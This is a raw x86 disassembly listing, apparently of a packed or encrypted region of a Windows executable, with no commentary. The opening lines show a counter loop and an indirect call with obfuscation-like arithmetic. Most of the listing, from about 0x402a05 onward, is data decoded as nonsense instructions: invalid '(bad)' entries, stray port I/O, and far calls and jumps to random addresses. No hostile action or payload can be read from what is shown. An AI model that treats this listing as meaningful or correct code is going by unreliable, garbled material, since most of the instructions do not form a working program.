  40294f:	pop    edi
  402950:	push   esp
  402951:	add    BYTE PTR [eax],al
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432cde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43429e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43429e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43429e,edi
  402989:	cmp    DWORD PTR ds:0x43429e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43429e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43427e
  4029ab:	push   0x4692
  4029b0:	push   0x432638
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432bea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432ce6,0x432cbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43426a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi-0x11f9ee04],ah
  402a13:	or     dh,cl
  402a15:	add    BYTE PTR [eax+esi*2],cl
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a65
  402a1e:	or     DWORD PTR [edi-0x5953039a],ebp
  402a24:	iret   
  402a25:	jo     0x402a2e
  402a27:	or     eax,0x49f2ef92
  402a2c:	(bad)  
  402a2e:	popa   
  402a2f:	test   BYTE PTR [eax],ch
  402a31:	add    eax,0x2908b965
  402a36:	cmp    dl,BYTE PTR [esi-0x74f4909d]
  402a3c:	pop    ds
  402a3d:	sbb    cl,BYTE PTR [ebp+eiz*2-0x6f165f25]
  402a44:	aaa    
  402a45:	mov    al,0x28
  402a47:	push   DWORD PTR [edi-0x2c2dbfbb]
  402a4d:	ins    BYTE PTR es:[edi],dx
  402a4e:	dec    edi
  402a4f:	jmp    DWORD PTR [eax+0x4ceeb73c]
  402a55:	int3   
  402a56:	bound  ecx,QWORD PTR [edi-0x3]
  402a59:	cld    
  402a5a:	and    eax,0x542fcedb
  402a5f:	daa    
  402a60:	loopne 0x402add
  402a62:	and    BYTE PTR [eax-0x4c],dh
  402a65:	hlt    
  402a66:	pop    edx
  402a67:	das    
  402a68:	inc    eax
  402a69:	fsub   QWORD PTR [ecx+0x72c9e5b3]
  402a6f:	or     ebp,esi
  402a71:	aad    0x9
  402a73:	lea    ebx,[esi]
  402a75:	das    
  402a76:	cmp    ch,BYTE PTR [ebx]
  402a78:	and    eax,0x26b17dd3
  402a7d:	add    cl,BYTE PTR [ecx]
  402a7f:	xchg   al,cl
  402a81:	dec    edi
  402a82:	xor    DWORD PTR [esi],ecx
  402a84:	push   es
  402a85:	int3   
  402a86:	shr    ch,0x21
  402a89:	fwait
  402a8a:	fwait
  402a8b:	mov    al,ds:0xcc8cb396
  402a90:	jp     0x402a47
  402a92:	jl     0x402a5c
  402a94:	add    al,0xec
  402a96:	mov    eax,ds:0x13459af
  402a9b:	cmp    dh,ch
  402a9d:	adc    al,BYTE PTR [esi+0x2a]
  402aa0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402aa2:	fnop   
  402aa4:	pushf  
  402aa5:	cmp    BYTE PTR [eax+0x7cc3cf],dh
  402aab:	bound  eax,QWORD PTR [edx+0x453d4df0]
  402ab1:	daa    
  402ab2:	in     eax,dx
  402ab3:	add    eax,0x3998652d
  402ab8:	lods   eax,DWORD PTR ds:[esi]
  402ab9:	jne    0x402b24
  402abb:	inc    ebp
  402abc:	push   ds
  402abd:	sub    DWORD PTR [ebp-0x75094c32],ebp
  402ac3:	sbb    eax,DWORD PTR [edx-0x59]
  402ac6:	add    BYTE PTR [ebp-0x62f82c9c],bh
  402acc:	fwait
  402acd:	jno    0x402a8f
  402acf:	push   ecx
  402ad0:	(bad)  
  402ad1:	aaa    
  402ad2:	call   0xcbb536de
  402ad7:	jno    0x402ae2
  402ad9:	xchg   ebx,eax
  402ada:	inc    esp
  402adb:	sbb    bl,cl
  402add:	sub    ecx,DWORD PTR ds:0x724ba4ed
  402ae3:	jns    0x402a89
  402ae5:	repnz in al,dx
  402ae7:	gs pusha 
  402ae9:	sbb    al,0xa9
  402aeb:	dec    ebx
  402aec:	jmp    0x99bfc568
  402af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af2:	test   al,0x18
  402af4:	stos   DWORD PTR es:[edi],eax
  402af5:	fwait
  402af6:	aaa    
  402af7:	mov    BYTE PTR [ecx+ebp*8+0x26],ch
  402afb:	test   eax,0x3f95762f
  402b00:	xchg   edx,eax
  402b01:	jo     0x402b6b
  402b03:	aaa    
  402b04:	adc    BYTE PTR [esi+0x3c],ah
  402b07:	(bad)  
  402b08:	inc    ecx
  402b09:	lahf   
  402b0a:	adc    ah,dl
  402b0c:	sbb    DWORD PTR [edx+0x25e317f4],0xffffffd2
  402b13:	mov    cs,WORD PTR [esi-0xd]
  402b16:	retf   0x2236
  402b19:	test   eax,0xe91953af
  402b1e:	jecxz  0x402b75
  402b20:	or     dh,BYTE PTR [esi+eiz*8]
  402b23:	dec    ebp
  402b24:	(bad)  
  402b25:	xor    al,0x90
  402b27:	push   0x15ce1bd4
  402b2c:	xor    DWORD PTR [edx-0x32],0x6a755224
  402b33:	mov    cl,0x63
  402b35:	xchg   ebp,eax
  402b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b37:	inc    ebp
  402b38:	xchg   ecx,eax
  402b39:	cmp    edx,DWORD PTR [ebp+0x7]
  402b3c:	(bad)  
  402b3d:	mov    ah,0xa6
  402b3f:	loopne 0x402ac4
  402b41:	inc    esp
  402b42:	ret    
  402b43:	ror    BYTE PTR ds:0xa227c799,0xd4
  402b4a:	arpl   WORD PTR [edi-0x65],cx
  402b4d:	into   
  402b4e:	push   0xe8d8e0eb
  402b53:	call   0x153316f1
  402b58:	loopne 0x402b6a
  402b5a:	xchg   esp,eax
  402b5b:	test   eax,0xa695a8af
  402b60:	inc    ecx
  402b61:	pop    ecx
  402b62:	push   esi
  402b63:	pop    esp
  402b64:	out    0x9a,eax
  402b66:	lods   eax,DWORD PTR ds:[esi]
  402b67:	(bad)  
  402b68:	std    
  402b69:	jle    0x402bdb
  402b6b:	sahf   
  402b6c:	into   
  402b6d:	mov    al,BYTE PTR [esi]
  402b6f:	out    0xe3,al
  402b71:	sbb    DWORD PTR [eax-0x1],esi
  402b74:	xor    al,0xef
  402b76:	mov    ah,0x94
  402b78:	jmp    0x8dc93086
  402b7d:	fstp   TBYTE PTR [esi+0x4adeb154]
  402b83:	add    al,0x39
  402b85:	mov    ds:0x2a01bc7a,al
  402b8a:	sbb    bl,BYTE PTR [edi-0x22]
  402b8d:	add    ah,cl
  402b8f:	pop    es
  402b90:	mov    edi,0xc8cbf2f7
  402b95:	add    DWORD PTR [ebx-0x452d1188],ebx
  402b9b:	sub    eax,0x80717b5c
  402ba0:	pusha  
  402ba1:	imul   edx,DWORD PTR [esi+eax*1+0x60],0x384c07cc
  402ba9:	mov    al,ds:0xa0eea93
  402bae:	call   0xdd86:0x7374e6a4
  402bb5:	mov    dl,0xee
  402bb7:	push   es
  402bb8:	mov    dl,0xd6
  402bba:	sub    ch,0xcc
  402bbd:	icebp  
  402bbe:	daa    
  402bbf:	pop    ecx
  402bc0:	ja     0x402bc7
  402bc2:	stos   DWORD PTR es:[edi],eax
  402bc3:	pop    ds
  402bc4:	dec    ebx
  402bc5:	loope  0x402bc8
  402bc7:	jge    0x402bf3
  402bc9:	inc    esi
  402bca:	mov    ebx,0xdaa28c67
  402bcf:	dec    ebx
  402bd0:	fs loopne 0x402bff
  402bd3:	stos   DWORD PTR es:[edi],eax
  402bd4:	xchg   edx,eax
  402bd5:	xlat   BYTE PTR ds:[ebx]
  402bd6:	add    al,0x99
  402bd8:	pushf  
  402bd9:	pop    esi
  402bda:	jle    0x402b91
  402bdc:	push   ecx
  402bdd:	mov    bl,0xcd
  402bdf:	fmul   DWORD PTR [ecx+0x3f617260]
  402be5:	les    esi,FWORD PTR [ebx+0x77f539be]
  402beb:	retf   
  402bec:	nop
  402bed:	sahf   
  402bee:	sbb    bl,BYTE PTR [ecx]
  402bf0:	test   al,0xac
  402bf2:	stos   BYTE PTR es:[edi],al
  402bf3:	and    DWORD PTR [eax-0x4cf1e9e7],ecx
  402bf9:	adc    DWORD PTR [ecx],ebp
  402bfb:	push   cs
  402bfc:	in     eax,0xec
  402bfe:	mov    ah,0x1f
  402c00:	sub    edx,DWORD PTR [ecx]
  402c02:	sar    BYTE PTR [ebx],1
  402c04:	jle    0x402c21
  402c06:	call   0x3203:0x411479f1
  402c0d:	xchg   BYTE PTR [ecx+0x75bc135d],bl
  402c13:	scas   al,BYTE PTR es:[edi]
  402c14:	push   ss
  402c15:	loop   0x402c4a
  402c17:	adc    DWORD PTR [edi+edx*8],ebx
  402c1a:	in     al,dx
  402c1b:	add    eax,0x976e1fb9
  402c20:	and    DWORD PTR [edx-0x6d25936b],esi
  402c26:	jnp    0x402c65
  402c28:	fadd   st,st(6)
  402c2a:	shl    BYTE PTR [ebp+0x3fc517b3],cl
  402c30:	out    0x8a,al
  402c32:	cmp    dh,BYTE PTR [esi+0x5]
  402c35:	loop   0x402c00
  402c37:	jecxz  0x402bdf
  402c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c3a:	ds (bad) 
  402c3c:	mov    dl,0xbb
  402c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c3f:	imul   ecx,edx,0xffffffde
  402c42:	test   eax,ebx
  402c44:	es inc ebp
  402c46:	xchg   ebx,eax
  402c47:	and    ah,0x81
  402c4a:	ins    DWORD PTR es:[edi],dx
  402c4b:	cmp    edi,DWORD PTR ds:0xae68156c
  402c51:	clc    
  402c52:	xchg   esp,eax
  402c53:	mov    ebp,0xf9787dd9
  402c58:	xor    edx,DWORD PTR [eax-0x1d]
  402c5b:	mov    bl,0x19
  402c5d:	daa    
  402c5e:	sbb    ah,dh
  402c60:	int    0xa9
  402c62:	pop    eax
  402c63:	in     eax,dx
  402c64:	imul   BYTE PTR ds:0x68c15c3e
  402c6a:	daa    
  402c6b:	jecxz  0x402c5f
  402c6d:	inc    eax
  402c6e:	pop    esp
  402c6f:	dec    edi
  402c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c71:	js     0x402ca7
  402c73:	js     0x402c13
  402c75:	jnp    0x402cb1
  402c77:	fst    QWORD PTR [eax]
  402c79:	lahf   
  402c7a:	add    eax,0x4dfe14b2
  402c7f:	aaa    
  402c80:	inc    esi
  402c81:	push   ds
  402c82:	daa    
  402c83:	pop    eax
  402c84:	push   eax
  402c85:	mov    eax,0x5a91c126
  402c8a:	and    eax,0x58550f9f
  402c8f:	loopne 0x402ce9
  402c91:	dec    ebx
  402c92:	lods   al,BYTE PTR ds:[esi]
  402c93:	call   0xf480ec47
  402c98:	dec    edi
  402c99:	pop    ecx
  402c9a:	push   ecx
  402c9b:	fcmovb st,st(4)
  402c9d:	call   0x12ce:0x7cfcdf3a
  402ca4:	popa   
  402ca5:	xchg   esi,eax
  402ca6:	jmp    0x402cfa
  402ca8:	dec    edx
  402ca9:	fcmovb st,st(3)
  402cab:	mov    edi,0xf6de1aa
  402cb0:	mov    edi,0x18b1ef8b
  402cb5:	test   eax,0x291dc10f
  402cba:	push   ss
  402cbb:	outs   dx,BYTE PTR ds:[esi]
  402cbc:	sahf   
  402cbd:	stc    
  402cbe:	xor    ebp,DWORD PTR [ebx]
  402cc0:	lahf   
  402cc1:	aas    
  402cc2:	inc    ecx
  402cc3:	adc    esi,DWORD PTR [esi-0x2afecb9c]
  402cc9:	jo     0x402c85
  402ccb:	push   cs
  402ccc:	or     ebx,DWORD PTR [eax+eiz*8]
  402ccf:	test   BYTE PTR [ecx],dl
  402cd1:	fsubr  DWORD PTR [edi+edi*4+0x79]
  402cd5:	imul   ebp,DWORD PTR [esp+ebp*4+0x7da8a400],0x68bdb776
  402ce0:	pop    edx
  402ce1:	or     bh,BYTE PTR [eax-0x66c338b]
  402ce7:	jge    0x402c87
  402ce9:	cmp    ch,BYTE PTR [ebx+0x59]
  402cec:	inc    esp
  402ced:	int    0xb1
  402cef:	fwait
  402cf0:	fs mov cl,0xe7
  402cf3:	ret    
  402cf4:	inc    ecx
  402cf5:	lods   al,BYTE PTR ds:[esi]
  402cf6:	push   ds
  402cf7:	cmp    esp,DWORD PTR [ecx-0x43]
  402cfa:	jle    0x402d02
  402cfc:	jne    0x402cbf
  402cfe:	mov    cl,0x2a
  402d00:	xor    dh,bl
  402d02:	dec    esp
  402d03:	mov    WORD PTR [ebx+eax*2-0x48],fs
  402d07:	xor    edi,DWORD PTR [edi+0x33]
  402d0a:	xor    BYTE PTR [edi],ch
  402d0c:	aam    0x46
  402d0e:	jmp    0x402cf9
  402d10:	pop    ebp
  402d11:	pushf  
  402d12:	mov    ecx,0xf9b85304
  402d17:	mov    esi,0xf3a68df0
  402d1c:	adc    DWORD PTR ds:0xf64c2545,edi
  402d22:	sub    dh,BYTE PTR [edx-0x1205b5b4]
  402d28:	mov    BYTE PTR [esi],ch
  402d2a:	cmp    DWORD PTR [eax],edx
  402d2c:	inc    eax
  402d2d:	add    ebp,DWORD PTR [edi+0x6f]
  402d30:	mov    edi,0x3db6a3f6
  402d35:	dec    esi
  402d36:	popf   
  402d37:	adc    cl,BYTE PTR [ecx-0x5e82bda4]
  402d3d:	aam    0x64
  402d3f:	and    al,dl
  402d41:	js     0x402d4c
  402d43:	scas   al,BYTE PTR es:[edi]
  402d44:	xchg   BYTE PTR [eax+ebp*2-0x27],ah
  402d48:	push   es
  402d49:	loop   0x402d02
  402d4b:	mov    al,0xa3
  402d4d:	xchg   edi,eax
  402d4e:	xor    al,0x13
  402d50:	popa   
  402d51:	aam    0x77
  402d53:	jbe    0x402d23
  402d55:	add    eax,esp
  402d57:	jns    0x402d6d
  402d59:	call   FWORD PTR [edi]
  402d5b:	repnz lods eax,DWORD PTR ds:[esi]
  402d5d:	nop
  402d5e:	or     eax,0xb8a018b9
  402d63:	cld    
  402d64:	cmp    edx,ebx
  402d66:	dec    eax
  402d67:	add    esp,edx
  402d69:	push   ebp
  402d6a:	push   0xffffffe7
  402d6c:	lods   al,BYTE PTR ds:[esi]
  402d6d:	rol    DWORD PTR [ecx],cl
  402d6f:	in     eax,dx
  402d70:	pop    ebp
  402d71:	jmp    0x402d99
  402d73:	sti    
  402d74:	ficomp DWORD PTR [ecx]
  402d76:	jmp    0x402df4
  402d78:	sti    
  402d79:	stc    
  402d7a:	push   esi
  402d7b:	mov    dh,0x19
  402d7d:	fist   DWORD PTR [ebx+0x25]
  402d80:	(bad)  
  402d81:	fucomi st,st(3)
  402d83:	cmp    DWORD PTR [edx],esp
  402d85:	ret    0x7a8c
  402d88:	pop    ds
  402d89:	cmp    al,0x41
  402d8b:	mov    ecx,0x695e4780
  402d90:	shr    BYTE PTR [ecx+0x49d27cc8],0x74
  402d97:	sub    esp,DWORD PTR [ecx-0x70]
  402d9a:	mov    ebp,0x7c9015b2
  402d9f:	loop   0x402d31
  402da1:	sbb    al,BYTE PTR [ecx+eiz*1-0x335416a7]
  402da8:	test   al,0x22
  402daa:	pop    esi
  402dab:	adc    eax,0x8558530e
  402db0:	adc    eax,0xc76475fd
  402db5:	fisttp WORD PTR [ebx-0x4e160383]
  402dbb:	add    eax,DWORD PTR [eax]
  402dbd:	add    BYTE PTR [esi],ch
  402dbf:	out    dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	push   ebp
  402dcb:	mov    ch,0xd0
  402dcd:	or     eax,0x707009a7
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402d94
  402dd7:	fdivr  QWORD PTR [ebp-0x24]
  402dda:	mov    ?,WORD PTR [edx+edi*1]
  402ddd:	outs   dx,DWORD PTR ds:[esi]
  402dde:	add    al,0x60
  402de0:	test   al,0xf9
  402de2:	adc    al,0x9a
  402de4:	ret    0xb3d9
  402de7:	js     0x402e11
  402de9:	mov    dh,0xbf
  402deb:	pop    esp
  402dec:	jmp    0xb1e7c6bd
  402df1:	mov    esp,0xe6267703
  402df6:	aam    0x5b
  402df8:	stos   DWORD PTR es:[edi],eax
  402df9:	fcmovne st,st(4)
  402dfb:	call   0xdeff8204
  402e00:	test   BYTE PTR [eax-0x2e833160],cl
  402e06:	and    DWORD PTR [edi+edx*2-0x38],0xffffffe3
  402e0b:	pop    eax
  402e0c:	outs   dx,BYTE PTR ds:[esi]
  402e0d:	xlat   BYTE PTR ds:[ebx]
  402e0e:	cmp    BYTE PTR [ecx+0x31],dh
  402e11:	fist   WORD PTR [eax+0x4b]
  402e14:	adc    BYTE PTR [edi],ah
  402e16:	mov    ecx,edx
  402e18:	push   edx
  402e19:	inc    edx
  402e1a:	adc    DWORD PTR [edx+0x37],ebx
  402e1d:	push   ss
  402e1e:	inc    edx
  402e1f:	pop    ebx
  402e20:	xchg   DWORD PTR [ebp+edx*2-0x79013c92],eax
  402e27:	gs mov ah,0x9d
  402e2a:	xor    DWORD PTR [esi+0x5a],0x62
  402e2e:	adc    DWORD PTR [edx+ecx*2+0x49],ecx
  402e32:	mov    esp,0x651d6a01
  402e37:	mov    eax,ds:0xcde675a3
  402e3c:	pop    ecx
  402e3d:	jl     0x402dce
  402e3f:	jnp    0x402e3d
  402e41:	lods   eax,DWORD PTR ds:[esi]
  402e42:	idiv   ch
  402e44:	add    eax,0x60da12f7
  402e49:	mov    edx,DWORD PTR [edi+0x14d15714]
  402e4f:	out    0x66,eax
  402e51:	add    esi,eax
  402e53:	arpl   WORD PTR [ecx+0x1f],cx
  402e56:	repnz imul edx,DWORD PTR [eax+0x1f66163c],0x8ae881bd
  402e61:	dec    ecx
  402e62:	mov    DWORD PTR [eax+0x3f],ebp
  402e65:	xchg   esp,eax
  402e66:	(bad)  
  402e67:	out    dx,eax
  402e68:	xor    esp,DWORD PTR [esi+ecx*8]
  402e6b:	cld    
  402e6c:	es dec ecx
  402e6e:	add    esi,edi
  402e70:	enter  0xb436,0x65
  402e74:	inc    edx
  402e75:	push   edx
  402e76:	push   esp
  402e77:	jecxz  0x402ea4
  402e79:	xchg   edx,eax
  402e7a:	adc    eax,0x5135e47d
  402e7f:	adc    DWORD PTR [eax],0x3d
  402e82:	fisttp QWORD PTR [edx-0x73]
  402e85:	sbb    DWORD PTR [edi+0x328ff1aa],edi
  402e8b:	inc    ebx
  402e8c:	sahf   
  402e8d:	mov    dh,0x38
  402e8f:	add    eax,0x7f4682e9
  402e94:	fbstp  TBYTE PTR [esi-0x3]
  402e97:	cmc    
  402e98:	push   es
  402e99:	sbb    al,0x16
  402e9b:	sub    DWORD PTR [edx-0x6],0x7bdefe09
  402ea2:	repnz mov BYTE PTR [ebx],dh
  402ea5:	lods   al,BYTE PTR ds:[esi]
  402ea6:	xchg   ax,ax
  402ea8:	xchg   ebp,eax
  402ea9:	outs   dx,DWORD PTR ds:[esi]
  402eaa:	mov    ch,0x67
  402eac:	jmp    0xecdc:0xac6ba6a9
  402eb3:	sub    ch,BYTE PTR [edx+0x309db355]
  402eb9:	cdq    
  402eba:	cli    
  402ebb:	pop    eax
  402ebc:	mov    ds:0x10ba91a7,al
  402ec1:	enter  0x204b,0x79
  402ec5:	push   esp
  402ec6:	outs   dx,DWORD PTR ds:[esi]
  402ec7:	pop    esi
  402ec8:	test   BYTE PTR [edx],0xbc
  402ecb:	dec    edx
  402ecc:	out    dx,al
  402ecd:	push   ss
  402ece:	repnz push esi
  402ed0:	sbb    BYTE PTR [esi-0x56562a59],0x5d
  402ed7:	push   esp
  402ed8:	sub    eax,0xf12d7a8
  402edd:	add    BYTE PTR [ebp-0x69],bh
  402ee0:	repz xchg esp,eax
  402ee2:	fisttp QWORD PTR [esi+ebp*8-0xe]
  402ee6:	mov    ebx,0xf7f12a35
  402eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eec:	cwde   
  402eed:	mov    dl,dh
  402eef:	mov    BYTE PTR [ebp+0x18],ah
  402ef2:	mov    ecx,0xce9c9b43
  402ef7:	data16 mov dl,0xd1
  402efa:	add    eax,DWORD PTR [edi+0x19]
  402efd:	jns    0x402e9a
  402eff:	jo     0x402ed6
  402f01:	add    eax,0xcce7505b
  402f06:	lea    ecx,[edx-0x48]
  402f09:	popa   
  402f0a:	adc    BYTE PTR [esi+0x5eb4913d],dh
  402f10:	imul   esi,DWORD PTR [edi],0xc1e5bb
  402f16:	das    
  402f17:	pop    edx
  402f18:	push   eax
  402f19:	or     eax,0x2a9a48b3
  402f1e:	lahf   
  402f1f:	dec    eax
  402f20:	es adc eax,0x968b84c6
  402f26:	mov    ds:0xbd3e9a1e,al
  402f2b:	test   bh,0x9e
  402f2e:	out    0xf8,al
  402f30:	popf   
  402f31:	xchg   DWORD PTR [esi+0x477e5889],ebp
  402f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f38:	clc    
  402f39:	pop    ebx
  402f3a:	push   esi
  402f3b:	fcomp  DWORD PTR [ebx]
  402f3d:	cmp    BYTE PTR [edi],ah
  402f3f:	rcl    BYTE PTR [eax],cl
  402f41:	out    dx,eax
  402f42:	mov    dh,0xa4
  402f44:	jmp    0xd191:0x1f0eaeef
  402f4b:	out    dx,eax
  402f4c:	jmp    0x6766649f
  402f51:	lock and al,dh
  402f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f55:	loope  0x402ef3
  402f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f58:	int3   
  402f59:	iret   
  402f5a:	lds    ebp,FWORD PTR [ebp-0x7]
  402f5d:	outs   dx,DWORD PTR ds:[esi]
  402f5e:	je     0x402fb8
  402f60:	(bad)  
  402f61:	sub    dl,ch
  402f63:	stos   DWORD PTR es:[edi],eax
  402f64:	mov    al,0x8e
  402f66:	cmp    BYTE PTR [edx-0x1fd3cdd1],bl
  402f6c:	inc    esp
  402f6d:	push   0xffffffda
  402f6f:	and    DWORD PTR [edx+0x2a94fad7],eax
  402f75:	mov    ds:0x3286ae87,al
  402f7a:	and    DWORD PTR [esi+ebx*2+0x22f9eb2f],edx
  402f81:	(bad)  [ecx-0x7dd58e26]
  402f87:	std    
  402f88:	mov    bl,BYTE PTR [edi+0xa]
  402f8b:	aad    0xa9
  402f8d:	mov    edi,0x526a6478
  402f92:	xlat   BYTE PTR ds:[ebx]
  402f93:	ins    DWORD PTR es:[edi],dx
  402f94:	xchg   esp,eax
  402f95:	fs leave 
  402f97:	mov    ecx,0x79803305
  402f9c:	daa    
  402f9d:	test   DWORD PTR [ebp+esi*8+0x5a],edi
  402fa1:	mov    esp,0x2d36f49
  402fa6:	sbb    ebp,DWORD PTR [edx+0x23c041d9]
  402fac:	xor    al,0xdb
  402fae:	es dec ebx
  402fb0:	aas    
  402fb1:	jae    0x402f62
  402fb3:	in     al,dx
  402fb4:	push   esp
  402fb5:	pop    eax
  402fb6:	and    edi,DWORD PTR [ebx+0x6e5113e9]
  402fbc:	repnz sbb al,0x65
  402fbf:	stos   BYTE PTR es:[edi],al
  402fc0:	jo     0x402f52
  402fc2:	das    
  402fc3:	xchg   BYTE PTR [esi],ah
  402fc5:	into   
  402fc6:	fwait
  402fc7:	fwait
  402fc8:	(bad)  
  402fc9:	das    
  402fca:	push   es
  402fcb:	fcmove st,st(6)
  402fcd:	ins    DWORD PTR es:[edi],dx
  402fce:	sub    ebx,DWORD PTR [eax]
  402fd0:	push   ebp
  402fd1:	xchg   edi,eax
  402fd2:	ret    0xf25a
  402fd5:	push   eax
  402fd6:	sub    al,BYTE PTR [edi]
  402fd8:	mov    esp,0xbfd067af
  402fdd:	imul   ebp,DWORD PTR [edi-0x17],0x68
  402fe1:	adc    al,0xa2
  402fe3:	(bad)  
  402fe4:	sbb    DWORD PTR [ebp-0x79d53ea5],ebx
  402fea:	inc    eax
  402feb:	mov    al,ds:0xd397a26
  402ff0:	inc    edx
  402ff1:	daa    
  402ff2:	jnp    0x402fcf
  402ff4:	leave  
  402ff5:	and    al,0x6d
  402ff7:	push   ebp
  402ff8:	push   0xa
  402ffa:	cld    
  402ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffc:	mov    edx,DWORD PTR [esi]
  402ffe:	sub    esi,edi
  403000:	fcomp  QWORD PTR [edx-0x1e]
  403003:	mov    esp,0x9417b608
  403008:	sbb    ecx,esp
  40300a:	mov    esi,DWORD PTR [edx+0x46]
  40300d:	ja     0x403057
  40300f:	je     0x40305a
  403011:	xor    al,0x5
  403013:	mov    ah,0x18
  403015:	loope  0x402fcd
  403017:	xor    al,0x9e
  403019:	xchg   esi,eax
  40301a:	mov    ds:0x8d32adec,eax
  40301f:	mov    ch,0xc5
  403021:	icebp  
  403022:	xchg   edi,eax
  403023:	das    
  403024:	mov    bh,0x12
  403026:	popa   
  403027:	push   0xffffff91
  403029:	stc    
  40302a:	pop    ds
  40302b:	jns    0x402ff1
  40302d:	test   DWORD PTR [ebx-0x5c],ebp
  403030:	push   ss
  403031:	cmp    ch,BYTE PTR [ebp-0x4ef1b123]
  403037:	aam    0xae
  403039:	cmc    
  40303a:	adc    DWORD PTR [ebp-0x63],ecx
  40303d:	lea    edi,[ebp+esi*1+0x27]
  403041:	mov    eax,ds:0xe5f9453b
  403046:	and    eax,0x42dffc1b
  40304b:	call   0x782ef6c5
  403050:	ja     0x4030b4
  403052:	push   edx
  403053:	(bad)  
  403054:	cdq    
  403055:	imul   ebx,ebx,0x778243c3
  40305b:	pop    eax
  40305c:	mov    cl,0x55
  40305e:	cli    
  40305f:	add    dl,ch
  403061:	inc    ebx
  403062:	inc    edx
  403063:	push   esi
  403064:	shl    BYTE PTR [esi+edx*2-0x4111aaaa],0x53
  40306c:	aaa    
  40306d:	jecxz  0x402ffe
  40306f:	cmp    BYTE PTR [edx-0x41],al
  403072:	retf   0x1c52
  403075:	mov    DWORD PTR [ebx+eiz*4+0x1ccb42e9],0xb0b53aa3
  403080:	fst    DWORD PTR [edi-0x7f4d8988]
  403086:	mov    DWORD PTR [eax+0x2d],ebx
  403089:	ret    0x790b
  40308c:	sub    bh,dh
  40308e:	aas    
  40308f:	lds    edx,FWORD PTR [edx+0x51095eb5]
  403095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403096:	ret    
  403097:	bound  edi,QWORD PTR [eax+edi*1-0x50]
  40309b:	push   esp
  40309c:	aad    0x2c
  40309e:	or     cl,BYTE PTR [edi+0x11]
  4030a1:	add    edi,DWORD PTR [edx]
  4030a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030a4:	mov    WORD PTR [edi+0x25e06db8],ds
  4030aa:	jecxz  0x4030e2
  4030ac:	bnd jno 0x40312d
  4030af:	xchg   edx,eax
  4030b0:	(bad)  
  4030b1:	adc    eax,0x186d91ed
  4030b6:	adc    al,0x25
  4030b8:	jle    0x403133
  4030ba:	push   ebp
  4030bb:	std    
  4030bc:	loop   0x403054
  4030be:	in     eax,0x17
  4030c0:	je     0x403105
  4030c2:	idiv   BYTE PTR [ecx]
  4030c4:	push   0xffffffde
  4030c6:	sbb    al,0x53
  4030c8:	psllq  mm3,QWORD PTR [edi]
  4030cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030cc:	aam    0x21
  4030ce:	adc    dh,ch
  4030d0:	stos   BYTE PTR es:[edi],al
  4030d1:	pop    esp
  4030d2:	lock xchg esp,eax
  4030d4:	je     0x40310a
  4030d6:	jns    0x403124
  4030d8:	retf   
  4030d9:	or     ebp,esp
  4030db:	mov    DWORD PTR [ecx+0x47ef6fb8],ebx
  4030e1:	(bad)  
  4030e2:	dec    edx
  4030e3:	pop    ebx
  4030e4:	xor    BYTE PTR [esi],0xfc
  4030e7:	in     eax,0x8
  4030e9:	sbb    al,0x2e
  4030eb:	dec    ebp
  4030ec:	sub    BYTE PTR [ebp+0x6a],dl
  4030ef:	jl     0x4030f6
  4030f1:	loope  0x40309f
  4030f3:	xor    dl,BYTE PTR [ebx+0x55655f5]
  4030f9:	hlt    
  4030fa:	aad    0x95
  4030fc:	sub    eax,0xebfa1462
  403101:	mov    ecx,0x62062efb
  403106:	aam    0x75
  403108:	adc    ebp,DWORD PTR [esi]
  40310a:	loopne 0x403090
  40310c:	loopne 0x403095
  40310e:	cmc    
  40310f:	mov    eax,0x69b5295e
  403114:	sbb    DWORD PTR [eax+0x33],ebp
  403117:	mov    cl,0x21
  403119:	add    edi,DWORD PTR [ebx-0xd55cd3e]
  40311f:	push   esi
  403120:	sbb    ecx,DWORD PTR [edi-0x54]
  403123:	fist   DWORD PTR [edx-0x27]
  403126:	clc    
  403127:	inc    ebp
  403128:	dec    esi
  403129:	mov    edi,0xbb357288
  40312e:	pop    ebx
